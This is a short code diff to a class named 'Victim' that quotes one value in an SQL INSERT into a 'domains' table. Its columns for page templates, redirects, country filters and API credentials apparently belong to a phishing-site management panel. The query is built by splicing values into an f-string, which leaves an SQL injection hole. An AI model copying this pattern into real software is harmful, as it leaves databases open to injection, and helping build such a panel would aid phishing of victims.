@@ -163,7 +163,7 @@ class Victim:
                 cursor = conn.cursor()
                 cursor.execute(f"""
                     INSERT INTO domains(domain, path, servers, template, status, security, redirect, redirect_on_success, countries, created_on, app_id, api_hash)
-                    VALUES('{domain}', {path}, '{ns_servers}', '{page}', '{status}', '{security}', '{redirect}', '{redirect_on_success}', '{countries_db}', '{datetime.utcnow()}', '{app_id}', '{api_hash}')
+                    VALUES('{domain}', '{path}', '{ns_servers}', '{page}', '{status}', '{security}', '{redirect}', '{redirect_on_success}', '{countries_db}', '{datetime.utcnow()}', '{app_id}', '{api_hash}')
                 """)
   
                 conn.commit()
